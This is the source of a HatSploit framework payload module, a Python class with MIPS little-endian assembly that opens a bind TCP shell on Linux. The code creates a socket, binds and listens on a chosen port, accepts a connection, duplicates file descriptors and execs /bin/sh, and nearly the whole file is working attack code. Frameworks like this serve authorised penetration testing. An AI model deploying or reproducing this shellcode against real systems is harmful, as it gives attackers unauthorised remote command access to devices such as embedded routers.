"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, BindTCPHandler):
    def __init__(self):
        super().__init__({
            'Name': "Linux mipsle Shell Bind TCP",
            'Payload': "linux/mipsle/shell_bind_tcp",
            'Authors': [
                "Ivan Nikolskiy (enty8080) - payload developer",
            ],
            'Description': """
                This payload creates an interactive bind TCP shell for Linux
                with MIPS little-endian architecture.
            """,
            'Arch': ARCH_MIPSLE,
            'Platform': OS_LINUX,
        })

    def implant(self):
        return self.__asm__(
            """
            start:
                addiu   $s1, $zero, -3
                not     $s1, $s1
                move    $a0, $s2

            dup:
                move    $a1, $s1
                addiu   $v0, $zero, 0xfdf
                syscall 0x40404

                addiu   $s0, $zero, -1
                addi    $s1, $s1, -1
                bne     $s1, $s0, dup

                slti    $a2, $zero, -1
                lui     $t7, 0x6962
                ori     $t7, $t7, 0x2f2f
                sw      $t7, -0x14($sp)
                lui     $t6, 0x6873
                ori     $t6, $t6, 0x2f6e
                sw      $t6, -0x10($sp)
                sw      $zero, -0xc($sp)
                addiu   $a0, $sp, -0x14
                sw      $a0, -8($sp)
                sw      $zero, -4($sp)
                addiu   $a1, $sp, -8
                addiu   $v0, $zero, 0xfab
                syscall 0x40404
            """
        )

    def run(self):
        return self.__asm__(
            f"""
            start:
                addiu   $sp, $sp, -0x20
                addiu   $t6, $zero, -3
                not     $a0, $t6
                not     $a1, $t6
                slti    $a2, $zero, -1
                addiu   $v0, $zero, 0x1057
                syscall 0x40404

                andi    $s0, $v0, 0xffff
                addiu   $t6, $zero, -0x11
                not     $t6, $t6
                addiu   $t5, $zero, -3
                not     $t5, $t5
                sllv    $t5, $t5, $t6
                addiu   $t6, $zero, 0x{self.rport.little.hex()}
                or      $t5, $t5, $t6
                sw      $t5, -0x20($sp)
                sw      $zero, -0x1c($sp)
                sw      $zero, -0x18($sp)
                sw      $zero, -0x14($sp)
                or      $a0, $s0, $s0
                addiu   $t6, $zero, -0x11
                not     $a2, $t6
                addi    $a1, $sp, -0x20
                addiu   $v0, $zero, 0x1049
                syscall 0x40404

                or      $a0, $s0, $s0
                addiu   $a1, $zero, 0x101
                addiu   $v0, $zero, 0x104e
                syscall 0x40404

                or      $a0, $s0, $s0
                slti    $a1, $zero, -1
                slti    $a2, $zero, -1
                addiu   $v0, $zero, 0x1048
                syscall 0x40404

                move    $s2, $v0
            """
        ) + self.implant()
